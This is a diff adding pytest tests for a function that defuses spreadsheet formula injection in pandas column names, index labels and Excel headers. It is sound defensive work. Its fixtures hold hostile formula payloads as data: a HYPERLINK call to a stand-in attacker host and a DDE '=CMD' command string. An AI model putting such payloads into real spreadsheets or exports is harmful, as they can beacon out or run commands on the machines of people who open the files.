@@ -51,6 +51,21 @@ def test_neutralize_dataframe_only_touches_object_columns() -> None:
     assert raw_vendor_note.startswith("=")
 
 
+def test_neutralize_dataframe_prefixes_dangerous_column_names() -> None:
+    payload = '=HYPERLINK("https://attacker.example/beacon","open")'
+    df = pd.DataFrame([{payload: 1, "safe": 2}])
+    safe = neutralize_dataframe(df)
+    assert list(safe.columns) == ["'" + payload, "safe"]
+    assert list(df.columns) == [payload, "safe"]
+
+
+def test_neutralize_dataframe_prefixes_dangerous_index_labels() -> None:
+    df = pd.DataFrame({"kVp": [80.0]}, index=pd.Index(['=CMD|"/C calc"!A0'], name="@SUM(1)"))
+    safe = neutralize_dataframe(df)
+    assert safe.index.name == "'@SUM(1)"
+    assert safe.index.tolist() == ["'=CMD|\"/C calc\"!A0"]
+
+
 def test_neutralized_xlsx_export_is_not_formula_cell() -> None:
     payload = '=HYPERLINK("https://attacker.example/beacon","open")'
     safe_df = neutralize_dataframe(pd.DataFrame([{"VendorNote": payload}]))
@@ -62,3 +77,17 @@ def test_neutralized_xlsx_export_is_not_formula_cell() -> None:
     cell = ws["A2"]
     assert cell.data_type == "s"
     assert cell.value.startswith("'")
+
+
+def test_neutralized_xlsx_header_is_not_formula_cell() -> None:
+    payload = '=HYPERLINK("https://attacker.example/beacon","open")'
+    safe_df = neutralize_dataframe(pd.DataFrame([{payload: "ok"}]))
+    buf = io.BytesIO()
+    with pd.ExcelWriter(buf, engine="openpyxl") as writer:
+        safe_df.to_excel(writer, index=False)
+    buf.seek(0)
+    ws = load_workbook(buf)["Sheet1"]
+    header = ws["A1"]
+    assert header.data_type == "s"
+    assert isinstance(header.value, str)
+    assert header.value.startswith("'")
